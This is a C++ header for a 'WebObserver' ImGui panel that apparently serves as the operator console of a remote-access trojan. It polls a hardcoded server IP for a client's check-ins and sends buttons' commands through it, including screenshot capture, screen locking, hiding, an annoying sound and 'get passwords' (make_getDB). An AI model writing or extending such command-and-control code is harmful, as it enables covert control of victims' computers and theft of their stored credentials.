#pragma once

#include <glad/glad.h>
#include <mutex>
#include <utility>
#include <thread>  

#include "RenderLayer.h"
#include "ImGui/imgui_impl_glfw.h"
#include "ImGui/imgui_impl_opengl3.h"
#include "HTPP.h"

#include "ImageView.h"
#include "Logger.h"

class WebObserver final:public RenderLayer
{
	std::string ip = "194.67.87.25";
	std::string lastCheckOut = "last";
	std::mutex lock;

	ImageView imageView;
	std::vector<std::pair<std::string, std::string>> commands
		= {{"Show","make_show"}, {"Hide","make_hide"} ,{"clear commands","clear"},{"Save screenshot","make_screen"},
			{"Lock","make_lock"} ,{"get passwords","make_getDB"} ,{"Alt tab","make_minimise"},{"Annoing sound","make_sound1"}, {"Exit","make_exit"} };
public:
	
	WebObserver()
	{
		imageView.ip = ip;
		std::thread t([&, this]()
		{
				while (true)
				{
					HTTP::getRequest(ip, [&, this](std::string responce)
						{
							lock.lock();
							if(!responce.empty())
								lastCheckOut.assign(responce);
							lock.unlock();
						}, "lastCheckOut");
					std::this_thread::sleep_for(std::chrono::milliseconds(300));
				}
		});
		t.detach();
	}
	void onBegin() override
	{
	}
	void onEnd() override
	{
		
	}
	void onDraw() override
	{

	}
	
	void sendCommand(const std::string& cmd)
	{
		HTTP::getRequest(ip, [&](std::string val) {Logger::log(cmd); }, cmd);
	}
	void drawCommandButton(std::string label, std::string command)
	{
		if (ImGui::Button(label.c_str()))
		{
			sendCommand(command);
		}
	}
	void onImGuiDraw()
	{
				
		ImGui::Begin("Server status");
		ImGui::Text("Web observer of app");
		ImGui::TextColored(ImVec4(0.1, 0.6, 0.2, 1),"Connected to: ");
		ImGui::SameLine();
		ImGui::TextColored(ImVec4(0.1, 0.99, 0.2, 1),"%s", ip.c_str());
		
		ImGui::TextColored(ImVec4(0.1, 0.99, 0.6, 1),"last checkout by client: %s", lastCheckOut.c_str());
		
		ImGui::End();

		imageView.onImGuiDraw();

		ImGui::Begin("Logs");
		ImGui::TextColored(ImVec4(0.1, 0.99, 0.2, 1), Logger::dumpLogs().c_str());
		ImGui::End();

		ImGui::Begin("Controls");

		for(auto& [first, second]:commands)
		{
			drawCommandButton(first, second);
		}
		ImGui::End();
	}
};
